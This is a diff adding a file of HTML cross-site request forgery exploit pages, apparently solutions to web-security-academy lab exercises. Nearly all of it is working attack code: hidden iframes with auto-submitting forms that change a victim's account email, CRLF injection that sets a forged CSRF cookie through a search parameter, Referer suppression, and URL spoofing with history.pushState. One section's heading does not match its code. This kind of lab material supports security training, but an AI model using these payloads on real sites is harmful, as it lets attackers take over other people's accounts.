@@ -1,0 +1,73 @@
+<html>
+    <body>
+        <h1>This is the page which loads for victim in which below code executes in background</h1>
+
+            <iframe style="display: none" name="csrf-iframe" src="" frameborder="0"></iframe>
+            <form action="https://0a4800b10305a5b0c072458100310060.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="xyz123@gmail.com">    
+            </form>
+            <script>document.getElementById("csrf-form").submit()</script>
+        
+    </body>
+</html>
+
+// CSRF token is tied to a non-session cookie
+
+<html>
+    <body>
+        <h1></h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0aad00b603aa6522c09c418000880021.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="xyz@gmail.com">
+            <input type="hidden" name="csrf" value="bWeEx58dIFqtQWGAzojGBb43vz4bkEMm">
+        </form>
+
+        <img style="display:none" src="https://0aad00b603aa6522c09c418000880021.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=5HXjTO1Amam52rW7EFdSRASUfImGObHy" onerror="document.forms[0].submit()">
+    </body>
+</html>
+
+// CSRF where Referer validation depends on header being present
+
+<html>
+    <body>
+        <h1>This is the page which loads for victim in which below code executes in background</h1>
+        <meta name="referrer" content="never">
+            <iframe style="display: none" name="csrf-iframe" src="" frameborder="0"></iframe>
+            <form action="https://0a2400bc0344efbac02f79b400a600a5.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="xyz123@gmail.com">    
+            </form>
+            <script>document.getElementById("csrf-form").submit()</script>
+        
+    </body>
+</html>
+
+
+
+<html>
+    <body>
+        <h1>This is the page which loads for victim in which below code executes in background</h1>
+        <script>history.pushState("", "", "/?0ad2002303352e46c08a39d400e20062.web-security-academy.net")</script>
+            <iframe style="display: none" name="csrf-iframe" src="" frameborder="0"></iframe>
+            <form action="https://0ad2002303352e46c08a39d400e20062.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="xyz123@gmail.com">    
+            </form>
+            <script>document.getElementById("csrf-form").submit()</script>
+        
+    </body>
+</html>
+
+
+// CSRF with broken Referer validation
+
+<html>
+    <body>
+        <h1></h1>
+        <iframe style="display:none" name="csrf-iframe"></iframe>
+        <form action="https://0aad00b603aa6522c09c418000880021.web-security-academy.net/my-account/change-email" method="post" id="csrf-form" target="csrf-iframe">
+            <input type="hidden" name="email" value="xyz@gmail.com">
+            <input type="hidden" name="csrf" value="bWeEx58dIFqtQWGAzojGBb43vz4bkEMm">
+        </form>
+
+        <img style="display:none" src="https://0aad00b603aa6522c09c418000880021.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=bWeEx58dIFqtQWGAzojGBb43vz4bkEMm" onerror="document.forms[0].submit()">
+    </body>
+</html>
